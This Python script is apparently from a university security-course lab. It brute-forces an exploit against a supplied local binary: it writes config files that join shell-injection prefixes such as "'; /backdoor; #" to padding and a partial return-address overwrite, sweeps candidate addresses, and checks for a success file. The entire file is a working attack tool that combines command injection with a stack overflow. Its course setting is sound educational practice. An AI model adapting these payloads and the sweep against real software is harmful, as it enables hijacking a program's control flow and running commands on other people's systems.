#!/usr/bin/env python3
"""Lab-only one-shot partial-return sweep for Project II Phase II.

This helper is intentionally narrow. It writes candidate `config.data` files
inside the supplied NYCU Project II shared directory, runs the supplied local
`/blogic` binary once per candidate, and checks whether the official IC-side
`/backdoor` produced `/shared/success.txt`.

It does not create `success.txt`, does not invoke `/backdoor`, and does not use
network access. Run it only inside the controlled course Docker lab.
"""

from __future__ import annotations

import argparse
import json
import resource
import subprocess
import time
from pathlib import Path


DEFAULT_PREFIXES = [
    b"'; /backdoor; #",
    b"x'; /backdoor; #",
    b"; /backdoor; #",
    b"/backdoor #",
]


def _disable_core_dumps() -> None:
    resource.setrlimit(resource.RLIMIT_CORE, (0, 0))


def _parse_prefixes(values: list[str] | None) -> list[bytes]:
    if not values:
        return DEFAULT_PREFIXES
    return [value.encode("latin-1") for value in values]


def _clear_round_files(shared_dir: Path) -> None:
    for name in ("config.data", "exploit_done", "success.txt"):
        try:
            (shared_dir / name).unlink()
        except FileNotFoundError:
            pass


def _build_value(prefix: bytes, ret_offset: int, target: int) -> bytes | None:
    raw_target = target.to_bytes(8, "little")[:3]
    if b"\x00" in raw_target or len(prefix) > ret_offset:
        return None
    return prefix + (b"A" * (ret_offset - len(prefix))) + raw_target


def sweep(args: argparse.Namespace) -> dict[str, object]:
    shared_dir = Path(args.shared_dir)
    success_path = shared_dir / "success.txt"
    blogic = Path(args.blogic)
    prefixes = _parse_prefixes(args.prefix)
    tried = 0
    started = time.time()

    for prefix in prefixes:
        for target in range(args.start, args.stop):
            value = _build_value(prefix, args.ret_offset, target)
            if value is None:
                continue

            _clear_round_files(shared_dir)
            (shared_dir / "config.data").write_bytes(b"user_input=" + value + b"\n")
            (shared_dir / "exploit_done").write_text("done\n", encoding="utf-8")

            result = subprocess.run(
                ["timeout", str(args.timeout), str(blogic)],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                preexec_fn=_disable_core_dumps,
                check=False,
            )
            tried += 1

            if success_path.exists():
                return {
                    "status": "success",
                    "target": hex(target),
                    "prefix": prefix.decode("latin-1"),
                    "returncode": result.returncode,
                    "tried": tried,
                    "elapsed_seconds": round(time.time() - started, 3),
                    "success_text": success_path.read_text(
                        encoding="utf-8", errors="replace"
                    ),
                }

            if args.progress and tried % args.progress == 0:
                print(
                    json.dumps(
                        {
                            "status": "progress",
                            "tried": tried,
                            "elapsed_seconds": round(time.time() - started, 3),
                            "last_target": hex(target),
                            "prefix": prefix.decode("latin-1"),
                        },
                        sort_keys=True,
                    ),
                    flush=True,
                )

    return {
        "status": "no_success",
        "tried": tried,
        "elapsed_seconds": round(time.time() - started, 3),
        "start": hex(args.start),
        "stop": hex(args.stop),
        "ret_offset": args.ret_offset,
        "prefix_count": len(prefixes),
    }


def main() -> int:
    parser = argparse.ArgumentParser(
        description="Run a lab-only Project II one-shot partial-return sweep."
    )
    parser.add_argument("--shared-dir", default="/shared")
    parser.add_argument("--blogic", default="/blogic")
    parser.add_argument("--start", type=lambda text: int(text, 0), default=0x401000)
    parser.add_argument("--stop", type=lambda text: int(text, 0), default=0x401A21)
    parser.add_argument("--ret-offset", type=int, default=97)
    parser.add_argument("--timeout", default="0.35s")
    parser.add_argument("--progress", type=int, default=500)
    parser.add_argument("--prefix", action="append")
    args = parser.parse_args()

    result = sweep(args)
    print(json.dumps(result, indent=2, sort_keys=True))
    return 0 if result["status"] in {"success", "no_success"} else 1


if __name__ == "__main__":
    raise SystemExit(main())
